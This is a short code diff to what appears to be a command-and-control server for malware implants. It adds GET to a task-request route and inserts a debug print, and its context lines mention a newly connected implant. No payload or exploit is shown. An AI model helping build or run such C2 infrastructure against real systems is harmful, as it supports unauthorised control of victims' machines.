@@ -26,9 +26,10 @@ def handle_register():
     print("Watch out sexy ;) a New Implant connected!")
     return "Success\n."
 
-@rpc.route("/task/request", methods=["POST"])
+@rpc.route("/task/request", methods=["POST", "GET"])
 def send_task():
     try:
+        print("heyyyy")
         task_request = TaskRequest()
         task_request.ParseFromString(request.get_data())
         
